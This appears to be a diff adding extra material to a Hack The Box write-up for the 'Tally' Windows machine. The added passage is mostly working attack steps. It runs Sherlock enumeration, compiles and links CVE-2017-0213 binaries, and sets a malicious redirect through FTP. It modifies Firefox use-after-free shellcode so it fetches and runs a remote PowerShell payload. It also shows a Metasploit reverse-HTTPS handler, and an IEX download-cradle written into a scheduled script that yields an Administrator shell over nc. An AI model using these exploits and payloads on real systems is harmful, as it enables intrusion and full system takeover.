@@ -907,6 +907,539 @@ C:\Windows\system32>
 ==================================================================================================================================
 
 EXTRA CONTENT
+We can also solve the box in different ways. We can download sherlock in order to be able to look for local privilege escalation 
+on the box.
+Commands and Output:
+==================================================================================================================================
+sudo git clone https://github.com/rasta-mouse/Sherlock.git
+==================================================================================================================================
+
+We can then download it locally on the box, itself.
+Commands and Output:
+==================================================================================================================================
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.20/Sherlock.ps1')
+Find-AllVulns
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+Find-AllVulns
+
+
+Title      : User Mode to Ring (KiTrap0D)
+MSBulletin : MS10-015
+CVEID      : 2010-0232
+Link       : https://www.exploit-db.com/exploits/11199/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Task Scheduler .XML
+MSBulletin : MS10-092
+CVEID      : 2010-3338, 2010-3888
+Link       : https://www.exploit-db.com/exploits/19930/
+VulnStatus : Not Vulnerable
+
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+MSBulletin : MS13-053
+CVEID      : 2013-1300
+Link       : https://www.exploit-db.com/exploits/33213/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenuEx Win32k NULL Page
+MSBulletin : MS13-081
+CVEID      : 2013-3881
+Link       : https://www.exploit-db.com/exploits/31576/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenu Win32k Null Pointer Dereference
+MSBulletin : MS14-058
+CVEID      : 2014-4113
+Link       : https://www.exploit-db.com/exploits/35101/
+VulnStatus : Not Vulnerable
+
+Title      : ClientCopyImage Win32k
+MSBulletin : MS15-051
+CVEID      : 2015-1701, 2015-2433
+Link       : https://www.exploit-db.com/exploits/37367/
+VulnStatus : Not Vulnerable
+
+Title      : Font Driver Buffer Overflow
+MSBulletin : MS15-078
+CVEID      : 2015-2426, 2015-2433
+Link       : https://www.exploit-db.com/exploits/38222/
+VulnStatus : Not Vulnerable
+
+Title      : 'mrxdav.sys' WebDAV
+MSBulletin : MS16-016
+CVEID      : 2016-0051
+Link       : https://www.exploit-db.com/exploits/40085/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Not Supported on single-core systems
+
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034
+CVEID      : 2016-0093/94/95/96
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
+VulnStatus : Not Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
+VulnStatus : Not Vulnerable
+
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A
+CVEID      : 2017-7199
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
+VulnStatus : Not Vulnerable
+==================================================================================================================================
+
+We don't find much but we can google windows github exploit.
+https://github.com/SecWiki/windows-kernel-exploits
+https://github.com/WindowsExploits/Exploits
+
+We have a bunch of proof of concepts.
+Commands and Output:
+==================================================================================================================================
+systeminfo
+
+Host Name:                 TALLY
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00376-30726-67778-AA877
+Original Install Date:     28/08/2017, 15:43:34
+System Boot Time:          25/05/2021, 00:21:39
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-gb;English (United Kingdom)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 166 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 876 MB
+Virtual Memory: In Use:    3,219 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB.LOCAL
+Logon Server:              \\TALLY
+Hotfix(s):                 2 Hotfix(s) Installed.
+                           [01]: KB3199986
+                           [02]: KB4015217
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.59
+                                 [02]: fe80::7c72:f3f3:7eb8:a73a
+                                 [03]: dead:beef::7c72:f3f3:7eb8:a73a
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+==================================================================================================================================
+
+Last hotfix installed "KB4015217" let's us know when was the last time the machine was patched.
+
+And based on google search of the hotfix it was in April 11, 2017
+https://support.microsoft.com/en-us/topic/april-11-2017-kb4015217-os-build-14393-1066-and-14393-1083-b5f79067-98bd-b4ec-8b81-5d858d7dc722
+
+We come to find a cve that was published in May 2017 which was CVE-2017-0213, you can find more info in
+https://nvd.nist.gov/vuln/detail/CVE-2017-0213
+
+This let's us know that the exploit should be able to work since it was released after the latest patch in april.
+Exploit is past pacth update.
+
+Next going to a windows box and downloading visual studio code for c++, once installed the follwoing steps are required.
+Commands and Output:
+==================================================================================================================================
+cd "c:\:Program Files (x86)"
+cd "Microsoft Visual Studio <tab>"
+cd "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build"
+cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build>vcvarsall.bat amd64
+cd VC
+vcvars64.bat amd64 
+cl
+cl CVE-2017-0213.cpp /EHsc /DUNICODE /D_UNICODE
+==================================================================================================================================
+
+The solution for using this privesc requires an interactive process such as "iexplore" in order to get that to work you need to get
+a meterpeter shell so that you could migrate your current non interactive process to an interactive one with migrate and PID of 
+the process. 
+
+Current version of Visual Studio does not work with the "#include bits/stdc++.h" so the binary may not be compiled will most likely
+need the pre-compiled binary to get it to work.
+
+You can grab a copy in the following web page.
+
+https://github.com/vaclaviklluk/Exploits/tree/master/CVE-2017-0213/Binaries
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+
+An alternative to getting user on the box which can be done through a firefox exploit, the exploit comes from a firefox
+vilnerability where an old version of firefox is installed on the server. This was grabbed through the ftp user.
+Commands and Output:
+==================================================================================================================================
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-31-17  11:51PM       <DIR>          From-Custodian
+10-01-17  11:37PM       <DIR>          Intranet
+08-28-17  06:56PM       <DIR>          Logs
+09-15-17  09:30PM       <DIR>          To-Upload
+09-17-17  09:27PM       <DIR>          User
+226 Transfer complete.
+ftp> cd Intranet
+250 CWD command successful.
+ftp> ls
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+09-11-17  10:25PM       <DIR>          Binaries
+226 Transfer complete.
+ftp> cd Binaries
+250 CWD command successful.
+ftp> ls
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+08-30-17  10:38PM             43046456 Firefox Setup 44.0.2.exe
+226 Transfer complete.
+==================================================================================================================================
+
+We can searchsploit, for firefox exploits. We find many but the main one we want to focus on is the html tree builder.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $searchsploit firefox | grep 424
+Mozilla Firefox < 45.0 - 'nsHtml5TreeBuilder' Use-After-Free (EMET 5.52 Bypass)                         | windows/remote/42484.html
+==================================================================================================================================
+
+The technique for this relies on a user hitting the server itself. So what we can do since we have upload rights through ftp
+is modify the index.html so that when a user hits our webage it will have the web broswer of the user go to our maclicious web
+page that contains our exploit code.
+
+So we write some html that we will upload via ftp that will redirect to our own http server.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $cat ffexploit.html 
+<html>
+        <meta http-equiv="refresh" content="0; URL='http://10.10.14.20/ffexploit.html'" />
+</html>
+==================================================================================================================================
+
+We can upload via ftp and setup a web browser.
+Commands and Output:
+==================================================================================================================================
+ftp> put index.html 
+local: index.html remote: index.html
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+109 bytes sent in 0.00 secs (3.2485 MB/s)
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $sudo python -m http.server 80
+[sudo] password for user: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.59 - - [25/May/2021 10:29:40] code 404, message File not found
+10.10.10.59 - - [25/May/2021 10:29:40] "GET /ffexploit.html HTTP/1.1" 404 -
+10.10.10.59 - - [25/May/2021 10:29:40] code 404, message File not found
+10.10.10.59 - - [25/May/2021 10:29:40] "GET /favicon.ico HTTP/1.1" 404 -
+10.10.10.59 - - [25/May/2021 10:29:40] code 404, message File not found
+
+..
+..
+..
+
+
+==================================================================================================================================
+
+Now we have to look at the exploit we will try to run, by default the exploit is just trying run a pop of calc.exe, we will want 
+to modify the exploit to instead run powershell and execute a maclious payload we will generate to trick the server into running.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $cat 42484.html 
+<!doctype html>
+<html>
+<head>
+<meta http-equiv="cache-control" content="no-cache" charset="utf-8" />
+<title>CVE-2016-1960</title>
+<script>
+
+..
+..
+..
+
+/* This is executed after having pivoted the stack.  `esp' points to a
+ * region on the heap, and the original stack pointer is stored in
+ * `edi'.  In order to bypass EMET, the shellcode should make sure to
+ * xchg edi, esp before any protected function is called.
+ *
+ * For convenience, the first two "arguments" to the shellcode is a
+ * module handle for kernel32.dll and the address of GetProcAddress() */
+const shellcode = [
+    "\x8b\x84\x24\x04\x00\x00\x00", /* mov eax, dword [esp + 0x4] */
+    "\x8b\x8c\x24\x08\x00\x00\x00", /* mov ecx, dword [esp + 0x8] */
+    "\x87\xe7",                     /* xchg edi, esp */
+    "\x56",                         /* push esi */
+    "\x57",                         /* push edi */
+    "\x89\xc6",                     /* mov esi, eax */
+    "\x89\xcf",                     /* mov edi, ecx */
+    "\x68\x78\x65\x63\x00",         /* push xec\0 */
+    "\x68\x57\x69\x6e\x45",         /* push WinE */
+    "\x54",                         /* push esp */
+    "\x56",                         /* push esi */
+    "\xff\xd7",                     /* call edi */
+    "\x83\xc4\x08",                 /* add esp, 0x8 */
+
+    "\x6a\x00",                     /* push 0 */
+    "\x68\x2e\x65\x78\x65",         /* push .exe */
+    "\x68\x63\x61\x6c\x63",         /* push calc */
+    "\x89\xe1",                     /* mov ecx, esp */
+    "\x6a\x01",                     /* push 1 */
+    "\x51",                         /* push ecx */
+    "\xff\xd0",                     /* call eax */
+    "\x83\xc4\x0c",                 /* add esp, 0xc */
+
+    "\x5f",                         /* pop edi */
+    "\x5e",                         /* pop esi */
+    "\x87\xe7",                     /* xchg edi, esp */
+    "\xc3",                         /* ret */
+];
+
+..
+..
+..
+
+==================================================================================================================================
+
+We first have to convert the command we want the remote machine to into hex, this can be accomplished through python. We need to print 
+in reverse since the the stack is first in last out.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $python2
+Python 2.7.18 (default, Apr 28 2021, 17:39:59) 
+[GCC 10.2.1 20210110] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> cmd = "powershell(IEX(IWR('http://10.10.14.20/mf.ps1'))"
+>>> for i in range(len(cmd), 0, -4):
+...     print cmd[i-4:i]
+... 
+1'))
+f.ps
+20/m
+.14.
+0.10
+://1
+http
+WR('
+EX(I
+ll(I
+rshe
+powe
+
+..
+..
+..
+==================================================================================================================================
+
+Now that we have the plain text for every for characters we can convert the plain text into hex via the following in python.
+Commands and Output:
+==================================================================================================================================
+>>> for i in range(len(cmd), 0, -4):
+...     print cmd[i-4:i].encode('hex')
+... 
+31272929
+662e7073
+32302f6d
+2e31342e
+302e3130
+3a2f2f31
+68747470
+57522827
+45582849
+6c6c2849
+72736865
+706f7765
+==================================================================================================================================
+
+We can now take the output and convert into hex format, this can be done via vim and using a macro to do it for every to 2 bytes 
+'\x'. To us a macro simply hit "q (AND) a" while in escape mode and perform the different modfications you need and hit escape and 
+q to exit the macro piece. To replicate the macro simply hit "@ (AND) a" to replicate the same modifications.
+Commands and Output:
+==================================================================================================================================
+\x31\x27\x29\x29
+\x66\x2e\x70\x73
+\x32\x30\x2f\x6d
+\x2e\x31\x34\x2e
+\x30\x2e\x31\x30
+\x3a\x2f\x2f\x31
+\x68\x74\x74\x70
+\x57\x52\x28\x27
+\x45\x58\x28\x49
+\x6c\x6c\x28\x49
+\x72\x73\x68\x65
+\x70\x6f\x77\x65
+
+==================================================================================================================================
+
+Now all we need to do is replace the calc.exe with our exploit code.
+Commands and Output:
+==================================================================================================================================
+    "\x31\x27\x29\x29",  
+    "\x66\x2e\x70\x73", 
+    "\x32\x30\x2f\x6d", 
+    "\x2e\x31\x34\x2e", 
+    "\x30\x2e\x31\x30", 
+    "\x3a\x2f\x2f\x31", 
+    "\x68\x74\x74\x70", 
+    "\x57\x52\x28\x27", 
+    "\x45\x58\x28\x49", 
+    "\x6c\x6c\x28\x49", 
+    "\x72\x73\x68\x65", 
+    "\x70\x6f\x77\x65", 
+==================================================================================================================================
+
+Once the calc.exe payload is modified with our powershell hex instead we can, now copy the exploit into ffexploit.html so that the 
+web browser and can run it. We also make sure our handler is up and running
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally]
+└──╼ $cp unicorn/powershell_attack.txt www/mf.ps1
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tally/unicorn]
+└──╼ $sudo msfconsole -r unicorn.rc
+                                                  
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v6.0.44-dev                          ]
++ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
++ -- --=[ 594 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+
+Metasploit tip: After running db_nmap, be sure to 
+check out the result of hosts and services
+
+[*] Processing unicorn.rc for ERB directives.
+resource (unicorn.rc)> use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+resource (unicorn.rc)> set payload windows/meterpreter/reverse_https
+payload => windows/meterpreter/reverse_https
+resource (unicorn.rc)> set LHOST 10.10.14.20
+LHOST => 10.10.14.20
+resource (unicorn.rc)> set LPORT 443
+LPORT => 443
+resource (unicorn.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (unicorn.rc)> set AutoVerifySession false
+AutoVerifySession => false
+resource (unicorn.rc)> set AutoSystemInfo false
+AutoSystemInfo => false
+resource (unicorn.rc)> set AutoLoadStdapi false
+AutoLoadStdapi => false
+resource (unicorn.rc)> exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > 
+[*] Started HTTPS reverse handler on https://10.10.14.20:443
+
+msf6 exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                            Payload opts
+  --  ----                    -------                            ------------
+  0   Exploit: multi/handler  windows/meterpreter/reverse_https  https://10.10.14.20:443
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $mv 42484.html ffexploit.html
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $sudo python -m http.server 80
+[sudo] password for user: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.59 - - [25/May/2021 11:12:23] code 404, message File not found
+10.10.10.59 - - [25/May/2021 11:12:23] "GET /ffexploit.html HTTP/1.1" 404 -
+
+==================================================================================================================================
+
+And we wait for the exploit to execute. Since the creator of the box created a batch file under sarah browser.bat that 
+automatcally kills the firefox process, this makes the exploit harder to execute.
+Commands and Output:
+==================================================================================================================================
+10.10.10.59 - - [25/May/2021 11:29:10] "GET /ffexploit.html?continue=77571776 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:10] code 404, message File not found
+10.10.10.59 - - [25/May/2021 11:29:10] "GET /favicon.ico HTTP/1.1" 404 -
+10.10.10.59 - - [25/May/2021 11:29:10] code 404, message File not found
+10.10.10.59 - - [25/May/2021 11:29:10] "GET /favicon.ico HTTP/1.1" 404 -
+10.10.10.59 - - [25/May/2021 11:29:10] "GET /ffexploit.html?continue=143632064 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:11] "GET /ffexploit.html?continue=209692352 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:12] "GET /ffexploit.html?continue=275752640 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:13] "GET /ffexploit.html?continue=341812928 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:14] "GET /ffexploit.html?continue=407873216 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:15] "GET /ffexploit.html?continue=11515584 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:16] "GET /ffexploit.html?continue=77575872 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:16] "GET /ffexploit.html?continue=143636160 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:18] "GET /ffexploit.html?continue=209696448 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:19] "GET /ffexploit.html?continue=275756736 HTTP/1.1" 200 -
+10.10.10.59 - - [25/May/2021 11:29:20] "GET /ffexploit.html?continue=341817024 HTTP/1.1" 200 -
+..
+..
+..
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+==================================================================================================================================
+
+We see that the connection is killed by the user making the exploit not run, one way to stop this from happening is killing the
+interactive cmd process being run by the sarah user so that the browser.bat does not kill the firefox proccess being ran.
+
+You would need to get a shell on the box, look at the boxes ad kill any interactive "1" cmd processes. If ping stops that means the 
+correct cmd was killed.
 Commands and Output:
 ==================================================================================================================================
 ==================================================================================================================================
@@ -919,36 +1452,47 @@ Commands and Output:
 ==================================================================================================================================
 ==================================================================================================================================
 
-Commands and Output:
-==================================================================================================================================
-==================================================================================================================================
 
+Meanwhile if we had edited correctly the SPWarmUp.ps1 file with the following anfd waited an hour we would have gotten an admin
+shell baclk as the following
 Commands and Output:
 ==================================================================================================================================
-==================================================================================================================================
+echo "IEX(New-Object Net.webClient).DownloadString('http://10.10.14.20/rev-9002.ps1')" > SPBestWarmUp.ps1
+cat SPBestWarmUp.ps1
+IEX(New-Object Net.webClient).DownloadString('http://10.10.14.20/rev-9002.ps1')
 
-Commands and Output:
-==================================================================================================================================
-==================================================================================================================================
+..
+..
+..
 
-Commands and Output:
-==================================================================================================================================
-==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $sudo !!
+sudo python -m http.server 80
+[sudo] password for user: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.59 - - [24/May/2021 16:39:47] "GET /rev.ps1 HTTP/1.1" 200 -
+10.10.10.59 - - [24/May/2021 16:43:03] "GET /rev.ps1 HTTP/1.1" 200 -
+10.10.10.59 - - [24/May/2021 16:50:19] "GET /Sherlock.ps1 HTTP/1.1" 200 -
+10.10.10.59 - - [24/May/2021 16:57:42] "GET /rev-9002.ps1 HTTP/1.1" 200 -
 
-Commands and Output:
-==================================================================================================================================
-==================================================================================================================================
+..
+..
+..
 
-Commands and Output:
-==================================================================================================================================
-==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $rlwrap nc -lnvp 9002
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9002
+Ncat: Listening on 0.0.0.0:9002
+Ncat: Connection from 10.10.10.59.
+Ncat: Connection from 10.10.10.59:49885.
+Windows PowerShell running as user Administrator on TALLY
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
-Commands and Output:
-==================================================================================================================================
-==================================================================================================================================
+whoami
 
-Commands and Output:
-==================================================================================================================================
+tally\administrator
+PS C:\Users\Sarah\Desktop>
 ==================================================================================================================================
 
 Commands and Output:
